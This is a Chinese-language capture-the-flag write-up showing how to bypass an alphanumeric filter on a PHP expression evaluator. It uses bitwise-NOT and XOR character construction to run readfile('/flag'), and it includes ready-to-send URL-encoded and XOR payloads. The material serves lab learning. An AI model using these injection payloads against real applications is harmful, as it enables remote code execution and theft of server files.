# 内网渗透与高级社工-免杀payload制作-G2-WriteUP

进入靶机，看到表达式求值界面，输入字母或数字都不能通过校验，输入类似！可以通过校验，过滤很可能针对ASCII字母数字
![表达式求值](https://github.com/user-attachments/assets/384c69c2-81d1-43d3-b246-0fce0cb201e9)

在brup中看到响应头中表明服务器会把code中字段内容进行URL解码后用PHP执行，目标是在服务器中执行readfile(/flag)


通过用~将高位字节转为低位字节绕过过滤
$_ = ~'高位字节';      // 运行时得到 "readfile"
$_(~'高位字节');       // 运行时得到 "/flag"，并调用 readfile
目标：    r  e  a  d  f  i  l  e
十六进制：72 65 61 64 66 69 6C 65
取反前：  8D 9A 9E 9B 99 96 93 9A
得到%8D%9A%9E%9B%99%96%93%9A
其他字节经URL最终得到code=%24_%3D~%27%8D%9A%9E%9B%99%96%93%9A%27%3B%24_%28~%27%D0%99%93%9E%98%27%29%3B
通过brup发送POST请求，在响应中得到flag
![获取flag](https://github.com/user-attachments/assets/fe4839d7-a5c7-4d70-9a5a-4e26efe20e5b)

除此之外，可以通过特定的两个字符异或得到所需的英文字符
构造readfile
```text
) ^ [ = r
% ^ @ = e
! ^ @ = a
$ ^ @ = d
& ^ @ = f
) ^ @ = i
, ^ @ = l
% ^ @ = e
```

构造flag

```text
& ^ @ = f
, ^ @ = l
! ^ @ = a
: ^ ] = g
```

```php
得到(')%!$&),%'^'[@@@@@@@')('/'.('&,!:'^'@@@]'));
```
![网页端输入获取flag](https://github.com/user-attachments/assets/f3505463-fbcd-44a0-9f97-eb307f1efaf0)